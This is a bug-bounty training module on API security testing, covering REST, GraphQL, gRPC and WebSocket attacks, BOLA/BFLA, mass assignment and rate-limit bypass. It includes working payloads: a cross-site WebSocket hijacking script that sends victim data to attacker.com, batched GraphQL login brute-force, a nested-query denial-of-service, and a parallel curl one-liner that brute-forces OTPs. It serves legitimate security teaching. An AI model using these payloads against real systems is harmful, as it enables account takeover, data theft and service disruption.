API Security Testing

Bug Hunting • Module 08 • API Security

APIs are the backbone of modern web and mobile applications. Every single-page application, mobile app, and microservice architecture communicates through APIs — REST, GraphQL, gRPC, WebSocket. As frontends have become thinner, the API layer has absorbed the majority of business logic and data access. This makes APIs the highest-value attack surface in most bug bounty programs. This module covers systematic enumeration of API endpoints, protocol-specific attack techniques, authorization bypass patterns unique to APIs, and the methodology for turning API misconfigurations into high-severity bounty reports.

Section 01

REST API Enumeration

Before you can test an API for vulnerabilities, you need to know it exists. API enumeration is the process of discovering endpoints, methods, parameters, and versioning schemes that the application exposes. Many APIs are partially or fully undocumented — the frontend may only use a fraction of the available endpoints, leaving administrative, internal, and deprecated routes accessible to anyone who knows the path.

HTTP Methods and Their Implications

Every REST endpoint should be tested with all standard HTTP methods. Developers frequently implement GET handlers but forget to restrict PUT, DELETE, or PATCH on the same route. A read-only endpoint that also accepts DELETE requests is a critical finding.

Method Standard Use Security Implication
GET Retrieve a resource. Should be idempotent and safe (no side effects). Data exposure if authorization is missing. Parameters visible in URL, logs, and Referer headers.
POST Create a resource or submit data for processing. Mass assignment if the server binds request body directly to models without filtering fields.
PUT Replace an entire resource at the given URI. Often less protected than POST. Can overwrite fields the frontend never exposes (role, permissions).
PATCH Partially update a resource. Selective field modification — test adding fields not present in the original request (admin, verified).
DELETE Remove a resource. Destructive action. Often lacks authorization checks on individual resources (BOLA via DELETE).
OPTIONS Returns allowed methods and CORS headers for a resource. Reveals supported methods, CORS policy, and custom headers. Always send OPTIONS first during enumeration.
HEAD Identical to GET but returns only headers, no body. Can bypass content-length-based WAF rules. Useful for confirming endpoint existence without triggering alerts.

Endpoint Discovery Patterns

API endpoints follow predictable naming conventions. Once you identify the base path and versioning scheme, you can enumerate systematically. The most common patterns are:

# Common API base paths to check /api/ /api/v1/ /api/v2/ /api/v3/ /api/internal/ /api/private/ /api/admin/ /api/debug/ /graphql /graphql/console /gql /v1/ /v2/ /rest/ /service/ /services/ /rpc/ # Common resource endpoints under any base path /users /users/me /users/profile /accounts /admin /admin/users /admin/settings /admin/config /settings /config /health /status /metrics /info /debug /docs /swagger /swagger.json /swagger.yaml /openapi.json /openapi.yaml /api-docs /redoc /graphql/schema /actuator # Spring Boot actuator endpoints /actuator/env /actuator/health /actuator/mappings /env /trace /dump

Swagger and OpenAPI Specification Hunting

Many organizations deploy API documentation alongside their APIs and fail to restrict access. Swagger UI and OpenAPI specification files describe every endpoint, parameter, request body schema, authentication requirement, and response format — a complete blueprint for testing. Finding an exposed spec file eliminates the need for blind enumeration.

# Swagger/OpenAPI discovery paths $ curl -s -o /dev/null -w "%{http_code}" https://target.com/swagger.json $ curl -s -o /dev/null -w "%{http_code}" https://target.com/swagger/v1/swagger.json $ curl -s -o /dev/null -w "%{http_code}" https://target.com/api-docs $ curl -s -o /dev/null -w "%{http_code}" https://target.com/openapi.json $ curl -s -o /dev/null -w "%{http_code}" https://target.com/v2/api-docs $ curl -s -o /dev/null -w "%{http_code}" https://target.com/api/swagger-ui.html $ curl -s -o /dev/null -w "%{http_code}" https://target.com/.well-known/openapi.json # Fuzz for API documentation with ffuf $ ffuf -u https://target.com/FUZZ \ -w /usr/share/seclists/Discovery/Web-Content/swagger.txt \ -mc 200,301,302

API Versioning Exploitation

When an API migrates from v1 to v2, the older version is frequently left running. Deprecated versions often lack the security patches, rate limiting, and authorization improvements applied to the current version. If the current API is at /api/v3/, always test /api/v2/ and /api/v1/ for the same endpoints. Common findings include:

  • Missing authentication — v1 may not require tokens that v2 enforces
  • Relaxed authorization — RBAC checks added in v2 may be absent from v1 endpoints
  • Verbose responses — v1 may return full user objects while v2 filters sensitive fields
  • Missing rate limiting — Rate limits applied to v2 may not cover v1
  • Deprecated functionality — Admin endpoints removed from v2 documentation but still functional on v1
# Version comparison testing # Current version (v3) requires auth and returns filtered data $ curl -s https://target.com/api/v3/users/me {"error": "unauthorized"} # Deprecated version (v1) may skip auth entirely $ curl -s https://target.com/api/v1/users/me {"id": 1, "email": "admin@target.com", "role": "admin", "password_hash": "$2b$..."} # Check for undocumented internal API paths $ curl -s https://target.com/api/internal/users $ curl -s https://target.com/api/private/config $ curl -s https://target.com/api/debug/routes

The richest source of undocumented API endpoints is the application's own JavaScript. Modern SPAs bundle every API call into their JavaScript files. Download the main bundle, beautify it, and search for patterns like fetch(, axios., XMLHttpRequest, /api/, and baseURL. Tools like LinkFinder and JSParser automate this process, extracting all URLs and API paths from JavaScript files.
Section 02

◆ GraphQL Security

GraphQL is a query language for APIs that allows clients to request exactly the data they need. Unlike REST, where each endpoint returns a fixed data structure, GraphQL exposes a single endpoint that accepts structured queries. This flexibility introduces a unique set of security challenges: introspection leaks the entire schema, deeply nested queries can cause denial of service, and authorization must be enforced at the resolver level rather than the route level.

Introspection Queries

GraphQL introspection is a built-in feature that allows anyone to query the schema and discover every type, field, argument, and relationship in the API. While useful during development, leaving introspection enabled in production is equivalent to publishing your entire API documentation. Many production GraphQL APIs still have introspection enabled.

# Full introspection query — retrieves the entire schema { __schema { queryType { name } mutationType { name } types { name kind description fields { name description type { name kind ofType { name kind } } args { name type { name kind } defaultValue } } } } } # Send via curl $ curl -X POST https://target.com/graphql \ -H "Content-Type: application/json" \ -d '{"query": "{ __schema { types { name fields { name type { name } } } } }"}' # Minimal introspection probe (confirm if enabled) $ curl -X POST https://target.com/graphql \ -H "Content-Type: application/json" \ -d '{"query": "{ __typename }"}'

Field Suggestion Exploitation

Even when introspection is disabled, many GraphQL implementations offer field suggestions in error messages. If you query a non-existent field, the server responds with "Did you mean X, Y, or Z?" — effectively leaking field names. By systematically sending queries with plausible field name prefixes, you can reconstruct the schema without introspection.

# Field suggestion exploitation # Query a field that does not exist but is close to a real one $ curl -X POST https://target.com/graphql \ -H "Content-Type: application/json" \ -d '{"query": "{ usr { id } }"}' # Response may reveal real field names: # "Cannot query field \"usr\". Did you mean \"user\" or \"users\"?" # Iterate with common prefixes # adm -> "Did you mean admin, adminUser, adminSettings?" # pass -> "Did you mean password, passwordReset?" # sec -> "Did you mean secret, securityLog?" # Tool: clairvoyance — automated schema recovery via suggestions $ python3 clairvoyance.py -u https://target.com/graphql -o schema.json

Batching Attacks

GraphQL supports query batching — sending multiple operations in a single HTTP request. This is commonly exploited for brute-force attacks: instead of sending 1,000 login requests that trigger rate limiting, an attacker sends a single request containing 1,000 aliased login mutations. Most rate limiters count HTTP requests, not GraphQL operations within a request.

# Batched brute-force: 5 login attempts in a single HTTP request { a1: login(email: "admin@target.com", password: "password1") { token } a2: login(email: "admin@target.com", password: "password2") { token } a3: login(email: "admin@target.com", password: "password3") { token } a4: login(email: "admin@target.com", password: "password4") { token } a5: login(email: "admin@target.com", password: "admin") { token } } # Array-based batching (alternative format) [ {"query": "mutation { login(email: \"admin@target.com\", password: \"pass1\") { token } }"}, {"query": "mutation { login(email: \"admin@target.com\", password: \"pass2\") { token } }"}, {"query": "mutation { login(email: \"admin@target.com\", password: \"pass3\") { token } }"} ]

Nested Query Denial of Service

GraphQL's recursive type system allows deeply nested queries. If the schema includes circular relationships (a User has Posts, each Post has an Author who is a User, who has Posts...), an attacker can construct a query that nests dozens of levels deep, causing exponential resource consumption on the server. Without query depth limiting or query cost analysis, a single request can exhaust server memory or CPU.

# Nested query DoS — exponential resource consumption # Each level multiplies the data the server must resolve { users { posts { author { posts { author { posts { author { posts { title } } } } } } } } } # If each user has 10 posts, depth 8 = 10^8 = 100 million resolve operations

Authorization Bypass in Resolvers

In REST APIs, authorization is typically enforced at the route or middleware level. In GraphQL, authorization must be enforced in each individual resolver function. Developers frequently protect the top-level query but fail to authorize nested field resolvers. A user may be authorized to query their own profile, but the profile's organization field resolver may return all organization members without checking if the requesting user has permission to view them.

Mutation Abuse
GraphQL mutations modify server state. Once you discover mutations via introspection or field suggestions, test each one for authorization: can a regular user invoke admin mutations like deleteUser, updateRole, or resetPassword? Can an unauthenticated user invoke mutations that should require authentication? Mutation abuse is the GraphQL equivalent of BFLA in REST APIs and consistently produces high-severity findings.
Section 03

🔃 gRPC & WebSocket Testing

While REST and GraphQL dominate public-facing APIs, gRPC and WebSockets are increasingly common in internal services, real-time applications, and microservice communication. Both protocols receive less security scrutiny than REST, making them high-value targets for bug hunters who invest time in learning protocol-specific testing techniques.

gRPC Fundamentals and Reflection

gRPC uses Protocol Buffers (protobuf) as its serialization format and HTTP/2 as its transport layer. Unlike REST's human-readable JSON, gRPC messages are binary-encoded. gRPC Server Reflection is the equivalent of GraphQL introspection — when enabled, it allows clients to discover all available services and methods at runtime without needing the .proto definition files.

# grpcurl — command-line tool for interacting with gRPC servers # Like curl but for gRPC # List all services via reflection $ grpcurl -plaintext target.com:50051 list grpc.reflection.v1alpha.ServerReflection com.target.UserService com.target.AdminService com.target.InternalService # List methods for a specific service $ grpcurl -plaintext target.com:50051 list com.target.UserService com.target.UserService.GetUser com.target.UserService.UpdateUser com.target.UserService.DeleteUser com.target.UserService.ListUsers # Describe a method (shows request/response types) $ grpcurl -plaintext target.com:50051 describe com.target.UserService.GetUser # Call a method with JSON input $ grpcurl -plaintext \ -d '{"user_id": "1337"}' \ target.com:50051 com.target.UserService.GetUser # Call an admin method (test for missing authorization) $ grpcurl -plaintext \ -d '{"user_id": "1337", "role": "admin"}' \ target.com:50051 com.target.AdminService.UpdateRole

Protobuf Decoding

When reflection is disabled, you may encounter raw protobuf data in network traffic. Binary protobuf messages can be partially decoded without the schema — field numbers and wire types are visible, and string and integer values can be extracted. Tools like protoc --decode_raw and pbtk (Protobuf Toolkit) decode raw messages and help reconstruct the schema from observed traffic.

# Decode raw protobuf without a .proto file $ protoc --decode_raw < captured_message.bin 1: 1337 2: "admin@target.com" 3: "John Doe" 4: 1 5 { 1: "ROLE_ADMIN" 2: 1708300800 } # pbtk — Protobuf Toolkit for extracting .proto from binaries $ python3 -m pbtk extractors/from_binary target_app_binary

gRPC-Web Interception

gRPC-Web is a JavaScript library that allows browser-based clients to communicate with gRPC backends. Because browsers do not natively support HTTP/2 trailers required by gRPC, gRPC-Web uses a proxy (typically Envoy) that translates between gRPC-Web and native gRPC. This proxy is interceptable with Burp Suite — the requests use standard HTTP/1.1 or HTTP/2 with application/grpc-web content type. The body contains base64-encoded protobuf that can be decoded, modified, and re-encoded.

WebSocket Connection Hijacking

WebSocket connections begin with an HTTP Upgrade handshake, then switch to a persistent bidirectional channel. Security controls applied during the handshake must remain enforced for the lifetime of the connection. Common WebSocket vulnerabilities include:

  • Missing origin validation — The server does not check the Origin header during the Upgrade handshake, enabling cross-site WebSocket hijacking
  • No authentication on messages — Authentication is checked during the initial HTTP handshake but not on individual WebSocket messages
  • Message injection — User input included in WebSocket messages without sanitization, enabling XSS or command injection through the WebSocket channel
  • Lack of rate limiting — WebSocket messages bypass HTTP-based rate limiters entirely
  • Information leakage — Broadcast channels that send data to all connected clients without authorization checks

Cross-Site WebSocket Hijacking (CSWSH)

CSWSH is the WebSocket equivalent of CSRF. If a WebSocket endpoint does not validate the Origin header, an attacker can create a malicious page that opens a WebSocket connection to the target in the context of the victim's browser session. The victim's cookies are automatically sent with the Upgrade request, authenticating the attacker's connection.

<!-- CSWSH proof of concept --> <!-- Host this on attacker.com; victim visits while authenticated to target.com --> <script> // Victim's browser sends session cookies with the WebSocket upgrade var ws = new WebSocket("wss://target.com/ws/chat"); ws.onopen = function() { // Connection established with victim's session // Send commands as the victim ws.send(JSON.stringify({ action: "getMessages", channel: "admin" })); }; ws.onmessage = function(event) { // Exfiltrate received data to attacker's server new Image().src = "https://attacker.com/log?data=" + encodeURIComponent(event.data); }; </script>

Protocol Diversity as Opportunity
Most bug hunters focus exclusively on REST APIs. gRPC and WebSocket endpoints receive far less scrutiny, meaning findings are less likely to be duplicates. If a program's application uses real-time features (chat, notifications, live updates), there is almost certainly a WebSocket endpoint worth testing. If the backend is microservice-based, gRPC may be exposed — especially on non-standard ports.
Section 04

BOLA & BFLA

The OWASP API Security Top 10 was created specifically to address vulnerabilities unique to APIs, separate from the traditional OWASP Web Application Top 10. At the top of the API-specific list are BOLA (Broken Object Level Authorization) and BFLA (Broken Function Level Authorization) — the API equivalents of IDOR and privilege escalation. These two vulnerability classes account for more high-severity API bounty reports than all other categories combined.

OWASP API Security Top 10

ID Name Severity Description
API1 Broken Object Level Authorization Critical Accessing other users' objects by manipulating IDs in API requests. The most common and impactful API vulnerability.
API2 Broken Authentication Critical Weak authentication mechanisms: predictable tokens, missing token validation, authentication bypass via API versioning.
API3 Broken Object Property Level Authorization High Excessive data exposure and mass assignment. API returns more fields than needed or accepts fields that should be read-only.
API4 Unrestricted Resource Consumption Medium Missing rate limiting, pagination limits, or resource allocation controls. Enables DoS and brute-force attacks.
API5 Broken Function Level Authorization Critical Regular users accessing admin API functions. Often found by changing HTTP method or guessing admin endpoint paths.
API6 Unrestricted Access to Sensitive Business Flows High Automated abuse of business-critical workflows: ticket scalping, mass account creation, coupon abuse via API.
API7 Server Side Request Forgery Critical API accepts URLs as input and fetches them server-side. Access internal services, cloud metadata, and local files.
API8 Security Misconfiguration Medium Missing security headers, verbose errors, unnecessary HTTP methods, permissive CORS, exposed debug endpoints.
API9 Improper Inventory Management High Outdated API versions, unpatched endpoints, shadow APIs (undocumented). Lack of API inventory and lifecycle management.
API10 Unsafe Consumption of APIs High Trusting data from third-party APIs without validation. Injection via upstream API responses, SSRF via redirects.

BOLA: Broken Object Level Authorization

BOLA occurs when an API endpoint accepts an object identifier from the client (user ID, order number, document UUID) and returns or modifies that object without verifying the requesting user is authorized to access it. This is the single most common API vulnerability and the one most likely to produce a bounty. Every API endpoint that accepts an identifier is a potential BOLA target.

# BOLA testing methodology # Step 1: Create two accounts (User A and User B) # Step 2: As User A, perform actions and capture the API requests # Step 3: Note all object IDs in URLs, body, and headers # Step 4: Replay User A's requests using User B's auth token # Read another user's data (horizontal BOLA) GET /api/v1/users/1001/profile Authorization: Bearer <user_B_token> # If this returns User A's profile = BOLA # Modify another user's data PUT /api/v1/users/1001/profile Authorization: Bearer <user_B_token> Content-Type: application/json {"email": "attacker@evil.com"} # If this succeeds = write BOLA (higher severity) # Delete another user's resource DELETE /api/v1/users/1001/orders/5042 Authorization: Bearer <user_B_token> # If this succeeds = destructive BOLA (critical)

BFLA: Broken Function Level Authorization

BFLA occurs when a regular user can invoke API functions intended for administrators or higher-privilege roles. Unlike BOLA (which is about accessing specific objects), BFLA is about accessing entire categories of functionality. The classic pattern: an application hides admin UI elements from regular users but the underlying API endpoints accept requests from any authenticated user.

BOLA Patterns

  • Sequential integer IDs (/users/1001, /users/1002)
  • UUIDs leaked in other responses or URL patterns
  • Encoded IDs (Base64, hex) that are easily decoded
  • Object references in request body, not just URL
  • Nested resource access (/orgs/1/users/2/docs/3)

BFLA Patterns

  • Admin endpoints accessible with user token
  • Changing HTTP method reveals different access (GET vs POST)
  • Admin paths guessable from user paths (/api/users vs /api/admin/users)
  • Role-specific endpoints with no role check server-side
  • Internal API endpoints reachable from external network

Testing Methodology for BOLA and BFLA

  1. Create multiple accounts at different privilege levels: unauthenticated, standard user (User A), standard user (User B), and admin (if possible through self-registration or invitation).
  2. Map all endpoints and note every instance where an object identifier appears in the URL, request body, query parameters, or headers.
  3. Capture the full request set for the highest-privilege account using Burp Suite's proxy. This gives you the complete list of admin-only endpoints.
  4. Replay admin requests with user tokens. For every admin endpoint, substitute the admin's authorization token with a regular user's token. A 200 or non-403 response indicates BFLA.
  5. Swap object IDs between users. For every endpoint that operates on a specific resource, replace the resource ID with one belonging to another user. Test with both User A's ID from User B's session and vice versa.
  6. Test all HTTP methods. If GET is protected, try PUT, PATCH, DELETE, and POST on the same endpoint. Authorization checks are frequently implemented per-method, not per-endpoint.
  7. Test unauthenticated access. Remove the Authorization header entirely. Some endpoints intended for internal service-to-service calls have no authentication requirement at all.
Automated BOLA Detection at Scale
Burp Suite's Autorize extension automates BOLA and BFLA testing. Configure it with two session tokens (low privilege and high privilege), then browse the application normally with the high-privilege account. Autorize automatically replays every request with the low-privilege token and flags endpoints where the response is identical or similar — indicating the authorization check is missing. This turns hours of manual testing into a passive background scan.
Section 05

Mass Assignment & Parameter Pollution

Mass assignment and parameter pollution exploit the gap between what a frontend sends and what a backend accepts. When a server binds incoming request parameters directly to internal data models without filtering, attackers can inject fields that the application never intended to expose — escalating their privileges, bypassing payment, or modifying data they should not control.

Mass Assignment Explained

Mass assignment occurs when an API accepts a JSON body and maps it directly to a database model without explicitly listing which fields are allowed. The frontend registration form sends {"name": "Alice", "email": "alice@example.com"}, but the backend User model has an isAdmin field. If the API does not filter incoming fields, an attacker can include "isAdmin": true in their registration request and receive administrator privileges.

# Mass assignment test: add unexpected fields to a legitimate request # Normal registration request (captured from frontend) POST /api/v1/register Content-Type: application/json { "name": "Alice", "email": "alice@example.com", "password": "SecurePass123!" } # Mass assignment attempt: inject privilege fields POST /api/v1/register Content-Type: application/json { "name": "Alice", "email": "alice@example.com", "password": "SecurePass123!", "role": "admin", "isAdmin": true, "verified": true, "balance": 99999, "plan": "enterprise" } # Profile update: modify fields not exposed in the UI PUT /api/v1/users/me Content-Type: application/json { "name": "Alice Updated", "role": "admin", "organizationId": "1", "permissions": ["read", "write", "delete", "admin"] }

Framework-Specific Patterns

Framework Vulnerability Pattern Defense Mechanism
Ruby on Rails ActiveRecord binds all request params to model attributes unless filtered. The 2012 GitHub mass assignment exploit used this to push to any repo. strong_parameters — require/permit pattern. Only explicitly permitted fields are accepted.
Django (Python) Model forms accept all fields in the model by default. ModelForm with no fields or exclude is vulnerable. Explicit fields = [...] on forms and serializers. DRF serializers require declared fields.
Express (Node.js) Direct use of req.body in MongoDB/Mongoose operations: User.create(req.body) accepts any field. Destructure only needed fields: const { name, email } = req.body; or use validation libraries like Joi.
Spring (Java) @ModelAttribute and Jackson deserialization bind JSON to POJOs. All settable fields are writable by default. @JsonIgnoreProperties, DTOs (Data Transfer Objects) with limited fields, or @InitBinder with allowed fields.
Laravel (PHP) Model::create($request->all()) passes all input to the ORM. Mass assignment via $fillable misconfiguration. $fillable (whitelist) or $guarded (blacklist) on Eloquent models. Use Form Requests for validation.

Finding Hidden Parameters

The key to successful mass assignment is knowing which fields exist on the backend model. Several techniques reveal these hidden parameters:

  • API response analysis — GET responses often include fields that are read-only on the frontend but writable on the backend. If the profile API returns role, try including it in a PUT request.
  • Error messages — Some frameworks reveal model fields in validation errors: "Unknown field: isAdmin" confirms the field exists even if rejected.
  • API documentation — Swagger/OpenAPI specs list all fields, including those not used by the frontend.
  • Common field names — Test universally common fields: role, admin, isAdmin, verified, active, permissions, plan, tier, credits, balance, organizationId, groupId.
  • Param Miner — Burp extension that automatically discovers hidden parameters by fuzzing with a wordlist of common field names.

HTTP Parameter Pollution (HPP)

HTTP parameter pollution occurs when multiple parameters with the same name are sent in a single request, and different components in the request processing chain handle the duplicates differently. A WAF may check the first occurrence while the application uses the last, allowing the attacker to bypass input validation.

# HTTP Parameter Pollution — different servers handle duplicates differently # Sending duplicate parameters GET /transfer?amount=100&to=alice&amount=99999 # How different servers parse this: # Apache/PHP : amount = 99999 (last wins) # ASP.NET/IIS : amount = "100,99999" (concatenated) # Node.js/Express: amount = ["100", "99999"] (array) # Python/Flask : amount = 100 (first wins) # Java/Tomcat : amount = 100 (first wins) # Python/Django : amount = 99999 (last wins) # WAF bypass scenario: # 1. WAF checks first parameter and sees amount=100 (valid) # 2. Backend uses last parameter and processes amount=99999 # POST body pollution (Content-Type: application/x-www-form-urlencoded) POST /api/transfer amount=100&to=alice&amount=99999 # JSON pollution (duplicate keys) { "amount": 100, "to": "alice", "amount": 99999 } # Most JSON parsers use the last value for duplicate keys
✓
Mass Assignment Severity
Mass assignment that modifies role or isAdmin is critical — it is a direct privilege escalation. Modifying verified or active is high severity (bypasses business logic). Modifying balance or credits is high severity (financial impact). Even modifying non-sensitive fields like createdAt demonstrates the vulnerability pattern and should be reported — if one field is unprotected, others likely are too.
Section 06

Rate Limiting Bypass

Rate limiting is the primary defense against brute-force attacks, credential stuffing, and API abuse. When a rate limiter is absent or bypassable, the attacker gains unlimited attempts at authentication, password reset, OTP verification, and any other action that should be throttled. Rate limiting bypasses are consistently accepted as valid findings on bug bounty platforms because they directly enable other attacks.

Common Rate Limiting Implementations

IP-Based Limiting
Tracks requests per source IP address. The most common implementation. Vulnerable to IP rotation, proxy chains, and header spoofing. Does not protect against distributed attacks.
Network Layer
Token/Session-Based
Tracks requests per API key, session token, or user account. More resistant to IP rotation but vulnerable to token cycling and anonymous endpoint abuse. Better for authenticated endpoints.
Application Layer
Sliding Window
Counts requests within a moving time window (e.g., 100 requests per 60 seconds). More accurate than fixed windows but can still be gamed by timing requests at window boundaries.
Algorithm
💧
Token Bucket / Leaky Bucket
Tokens are added at a fixed rate. Each request consumes a token. Allows short bursts while enforcing average rate. More resilient to bypass but complex to implement correctly across distributed systems.
Algorithm

Bypass Techniques

Rate limiting bypasses exploit inconsistencies between how the rate limiter identifies requests and how the application processes them. The goal is to make the rate limiter see each request as unique while the application processes them identically.

Technique How It Works Example
IP Header Spoofing The rate limiter trusts X-Forwarded-For or similar headers to determine client IP. Rotate the header value to appear as different clients. X-Forwarded-For: 1.2.3.{N} where N increments with each request
Endpoint Variation Rate limits are applied per-path but the application normalizes paths. Different URL forms reach the same endpoint. /api/login, /api/LOGIN, /api/./login, /api/login/
HTTP Method Switching Rate limit applies to POST /login but the endpoint also accepts PUT or PATCH with the same functionality. Switch from POST to PUT, PATCH, or even GET with query parameters
Unicode Normalization Unicode characters that normalize to ASCII equivalents. Rate limiter sees different strings; application normalizes to the same value. Username admin vs admin (Unicode full-width 'a')
Blank/Null Byte Injection Adding null bytes or whitespace characters that are stripped by the application but counted differently by the rate limiter. /api/login%00, /api/login%20
API Key Cycling Create multiple API keys or accounts and rotate between them. Each key has its own rate limit bucket. Register 10 accounts, distribute requests across all 10 tokens

Race Conditions in Rate Limiting

Distributed rate limiters that use shared counters (Redis, Memcached) are vulnerable to race conditions. If the rate limit is 5 requests per minute and you send 20 requests simultaneously, the counter may not increment fast enough to block requests 6 through 20. This is especially effective against OTP verification endpoints — send all possible 4-digit OTP values in parallel and the rate limiter may not catch the burst.

# Race condition exploit: send many requests simultaneously # Using turbo-intruder (Burp extension) or GNU parallel # Generate OTP values and send all at once $ seq 0000 9999 | xargs -P 50 -I {} \ curl -s -o /dev/null -w "%{http_code} {}\n" \ -X POST https://target.com/api/verify-otp \ -H "Content-Type: application/json" \ -H "Cookie: session=abc123" \ -d "{\"otp\": \"{}\"}" # If rate limit is bypassed, one request returns 200 = valid OTP found
Rate Limit Bypass Impact Statement
A rate limiting bypass alone may be triaged as low/medium severity. To maximize impact in your report, demonstrate what the bypass enables: "The rate limit on the OTP verification endpoint can be bypassed using X-Forwarded-For header rotation, allowing an attacker to brute-force any 6-digit OTP in approximately 17 minutes, leading to account takeover of any user." Chain the bypass with its downstream impact — brute-force, credential stuffing, or data exfiltration.

API Key & Token Security

API keys, JWT tokens, and OAuth tokens are the authentication credentials of the API world. When these credentials leak, are improperly scoped, or are incorrectly validated, the consequences range from data exposure to full account takeover. API key and token vulnerabilities are some of the easiest findings to demonstrate and report because the impact is immediately clear.

API keys end up in places developers never intended. A systematic search of the following locations will frequently reveal exposed credentials:

JWT vs API Key vs OAuth Token

Credential Type Structure Common Vulnerabilities
API Key Static string, often hex or base64. No expiration unless explicitly managed. Typically sent as a header or query parameter. No rotation policy, overly broad scope, shared across environments, leaked in client-side code or logs.
JWT (JSON Web Token) Three base64url segments: header.payload.signature. Self-contained — the payload includes claims like user ID, role, and expiration. Algorithm confusion (none/HS256/RS256), missing signature verification, long or no expiration, sensitive data in payload, JWK injection.
OAuth 2.0 Token Access token (short-lived) + refresh token (long-lived). May be opaque strings or JWTs. Scoped to specific permissions. Insecure redirect_uri validation, authorization code interception, token leakage via Referer, insufficient scope restrictions, PKCE bypass.

Token Scope Testing

API keys and tokens should follow the principle of least privilege — each credential should only grant access to the resources and actions it explicitly needs. Overly permissive tokens are a common finding: a read-only API key that also allows write operations, a user-scoped token that can access admin endpoints, or a token issued for one microservice that is accepted by all microservices.

  1. Document the token's intended scope by reading the API documentation and observing what operations the frontend performs with the token.
  2. Test operations outside the intended scope. If the token is labeled "read-only," attempt POST, PUT, PATCH, and DELETE requests. If it is scoped to "users," attempt to access admin, billing, or configuration endpoints.
  3. Test cross-service acceptance. If the target has multiple APIs or microservices, send the token to each one. A token issued by the user service should not be accepted by the payment service.
  4. Test expired tokens. Send requests with tokens that have passed their expiration time. Some servers do not validate the exp claim.
  5. Test revoked tokens. Change the account password or explicitly revoke the token, then test if the old token still works. Stateless JWT implementations often cannot revoke tokens until they expire.
ℹ
Reporting Leaked API Keys
When reporting a leaked API key, include: (1) the exact location where the key was found, (2) the service the key authenticates to, (3) the permissions the key grants (tested by making API calls with it), and (4) the potential impact of those permissions. A leaked Google Maps API key with no usage restrictions is low severity. A leaked AWS key with S3 read access to customer data buckets is critical. Always verify the key is active and demonstrate its scope without accessing actual user data.
Section 08

API Testing Methodology

Systematic API Assessment Workflow

A structured API testing methodology ensures comprehensive coverage and reproducible results. Unlike web application testing where you interact with a visual interface, API testing is entirely request-response based. Every finding must be documented with exact HTTP requests that can be replayed by the triage team.

  1. API discovery and inventory. Enumerate all API endpoints through documentation hunting (Swagger/OpenAPI), JavaScript source analysis, traffic interception, and directory fuzzing. Build a complete endpoint inventory including method, path, parameters, authentication, and expected response.
  2. Authentication analysis. Identify the authentication mechanism (API key, JWT, OAuth, session cookie). Test for missing authentication, weak token generation, algorithm confusion (JWT), and credential leakage in responses, logs, or client-side code.
  3. Authorization testing (BOLA/BFLA). Create accounts at multiple privilege levels. Test every endpoint for horizontal access (User A accessing User B's data) and vertical access (regular user invoking admin functions). Use Autorize for automated coverage.
  4. Input validation testing. Test all parameters for injection (SQL, NoSQL, command, SSTI), mass assignment (adding unexpected fields), and type confusion (sending strings where integers are expected, arrays where strings are expected).
  5. Rate limiting and resource consumption. Test for missing or bypassable rate limits on authentication, password reset, OTP verification, and data export endpoints. Test for pagination abuse (requesting page_size=999999).
  6. Business logic analysis. Understand the application's workflows and test for logic flaws: can you skip steps in a multi-stage process, replay completed transactions, access resources in an unintended order, or abuse referral and discount systems via API?
  7. Data exposure review. Compare API responses to frontend rendering. Document any fields in API responses that are not displayed in the UI — these represent excessive data exposure (OWASP API3).
  8. Documentation and reporting. For every finding, capture the complete HTTP request and response, provide step-by-step reproduction instructions, quantify the business impact, and suggest a specific remediation.

Reporting API Vulnerabilities with Business Impact

API vulnerability reports require precise technical detail because the triage team must reproduce the issue using only your HTTP requests — there is no visual interface to reference. Every report should include:

  • Complete HTTP request — Method, URL, headers (including Authorization), and body. Redact only genuinely sensitive values; leave everything the triage team needs to reproduce.
  • Complete HTTP response — Status code, headers, and body. Highlight the specific fields that demonstrate the vulnerability.
  • Reproduction steps — Numbered sequence: (1) create account A, (2) create account B, (3) as account B send this request, (4) observe that account A's data is returned.
  • Business impact statement — Translate technical findings into business terms: "An attacker can read any user's profile data including email, phone number, and billing address by incrementing the user ID in the API request. With approximately 500,000 users on the platform, this exposes PII for the entire user base."
  • Remediation guidance — Specific, actionable advice: "Implement server-side authorization checks in the /api/v1/users/{id}/profile handler to verify the requesting user's ID matches the requested resource ID, or that the requesting user has an admin role."

The API Testing Checklist
For every API endpoint you discover, ask these questions: (1) Does it require authentication? Remove the token and check. (2) Does it enforce authorization? Send another user's token. (3) Does it validate all input? Send unexpected types, extra fields, and injection payloads. (4) Does it rate limit? Send 100 rapid requests. (5) Does it expose excessive data? Compare the API response to the frontend rendering. (6) Does it exist on deprecated API versions? Check v1 and v2. These six questions, applied systematically to every endpoint, will find the majority of API vulnerabilities.
